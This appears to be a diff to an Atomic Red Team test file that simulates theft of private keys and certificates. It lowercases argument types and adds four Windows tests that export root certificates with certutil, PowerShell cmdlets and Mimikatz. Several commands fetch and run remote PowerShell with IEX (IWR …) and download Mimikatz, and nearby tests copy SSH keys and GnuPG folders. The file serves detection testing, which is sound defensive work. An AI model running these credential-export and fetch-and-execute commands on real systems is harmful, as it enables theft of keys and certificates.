@@ -23,11 +23,11 @@ atomic_tests:
   input_arguments:
     search_path:
       description: Path where to start searching from.
-      type: Path
+      type: path
       default: /
     output_file:
       description: Output file containing locations of SSH key files
-      type: Path
+      type: path
       default: /tmp/keyfile_locations.txt
   executor:
     command: |
@@ -44,11 +44,11 @@ atomic_tests:
   input_arguments:
     search_path:
       description: Path where to start searching from.
-      type: Path
+      type: path
       default: /
     output_folder:
       description: Output folder containing copies of SSH private key files
-      type: Path
+      type: path
       default: /tmp/art-staging
   executor:
     command: |
@@ -67,11 +67,11 @@ atomic_tests:
   input_arguments:
     search_path:
       description: Path where to start searching from.
-      type: Path
+      type: path
       default: /
     output_folder:
       description: Output folder containing copies of SSH private key files
-      type: Path
+      type: path
       default: /tmp/art-staging
   executor:
     command: |
@@ -90,11 +90,11 @@ atomic_tests:
   input_arguments:
     search_path:
       description: Path where to start searching from
-      type: Path
+      type: path
       default: /
     output_folder:
       description: Output folder containing a copy of the .gnupg directory
-      type: Path
+      type: path
       default: /tmp/GnuPG
   executor:
     command: |
@@ -138,19 +138,19 @@ atomic_tests:
   input_arguments:
     adfs_service_account_name:
       description: Name of the ADFS service account
-      type: String
+      type: string
       default: "adfs_svc"
     replication_user:
       description: Username with replication rights. It can be the Domain Admin running the script
-      type: String
+      type: string
       default: "Administrator"
     replication_password:
       description: Password of replication_username
-      type: String
+      type: string
       default: "ReallyStrongPassword"
     adfs_server_name:
       description: Name of an ADFS server
-      type: String
+      type: string
       default: "sts.contoso.com"
   dependency_executor_name: powershell
   dependencies:
@@ -197,3 +197,111 @@ atomic_tests:
       Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
       Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
     name: powershell
+- name: CertUtil ExportPFX
+  auto_generated_guid: 336b25bf-4514-4684-8924-474974f28137
+  description: |
+    The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.
+    Keys will look like - \SystemCertificates\CA\Certificates or \SystemCertificates\Root\Certificates
+    Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
+    Reference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html
+  supported_platforms:
+  - windows
+  input_arguments:
+    output:
+      description: file path to export to
+      type: path
+      default: c:\temp\atomic.pfx
+    password:
+      description: password for cert
+      type: string
+      default: password
+  executor:
+    command: |
+      IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
+      certutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}
+    cleanup_command: |
+      Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item 
+    name: powershell
+    elevation_required: true
+- name: Export Root Certificate with Export-PFXCertificate
+  auto_generated_guid: 7617f689-bbd8-44bc-adcd-6f8968897848
+  description: |
+    Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.
+    Upon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.
+  supported_platforms:
+  - windows
+  input_arguments:
+    pfx_path:
+      description: output path of the certificate
+      type: string
+      default: $env:Temp\atomicredteam.pfx
+  executor:
+    command: |
+      $mypwd = ConvertTo-SecureString -String "AtomicRedTeam" -Force -AsPlainText
+      $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
+      Set-Location Cert:\LocalMachine\My
+      Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd
+    cleanup_command: |
+      try {
+      $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
+      Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
+      Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
+      } catch { }
+    name: powershell
+    elevation_required: true
+- name: Export Root Certificate with Export-Certificate
+  auto_generated_guid: 78b274f8-acb0-428b-b1f7-7b0d0e73330a
+  description: |
+    Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.
+    Upon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.
+  supported_platforms:
+  - windows
+  input_arguments:
+    pfx_path:
+      description: Path of the certificate
+      type: path
+      default: $env:Temp\AtomicRedTeam.cer
+  executor:
+    command: |
+      $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
+      Set-Location Cert:\LocalMachine\My
+      Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
+    cleanup_command: |
+      try {
+         $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore
+         Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
+         Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
+      }
+      catch { }
+    name: powershell
+    elevation_required: true 
+- name: Export Certificates with Mimikatz
+  auto_generated_guid: 290df60e-4b5d-4a5e-b0c7-dc5348ea0c86
+  description: |
+    The following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
+    A successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.
+  supported_platforms:
+  - windows
+  input_arguments:
+    mimikatz_exe:
+      description: Path of the Mimikatz binary
+      type: string
+      default: PathToAtomicsFolder\T1003.001\bin\x64\mimikatz.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Mimikatz must exist on disk at specified location (#{mimikatz_exe})
+    prereq_command: |
+      if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
+      $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
+      $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
+      $basePath = Split-Path #{mimikatz_exe} | Split-Path
+      Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
+  executor:
+    command: |
+      #{mimikatz_exe} "crypto::certificates /systemstore:local_machine /store:my /export"  exit
+    name: command_prompt
+    elevation_required: true
